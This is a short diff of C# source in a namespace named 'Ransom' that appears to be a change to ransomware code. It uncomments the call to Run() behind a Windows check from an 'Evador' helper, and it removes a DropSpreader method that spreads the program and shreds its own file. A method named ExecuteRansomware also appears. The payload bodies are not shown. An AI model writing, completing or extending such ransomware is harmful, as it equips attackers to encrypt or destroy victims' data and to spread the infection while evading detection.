@@ -1,4 +1,4 @@
-﻿using Shared;
+using Shared;
 
 namespace Ransom
 {
@@ -25,8 +25,7 @@ namespace Ransom
             if (!Evador.IsWindows())
                 return;
             
-            //await Run();
-            //await DropSpreader();
+            await Run();
         }
 
         private static async Task Run()
@@ -78,14 +77,6 @@ namespace Ransom
                     }
                 }
             }
-        }
-        
-        private static async Task DropSpreader()
-        {
-            Console.WriteLine("Starting to spread");
-
-            await Spreader.Spread();
-            Utility.ShredFile(Settings.CURRENT_PATH);
         }
 
         private static void ExecuteRansomware()
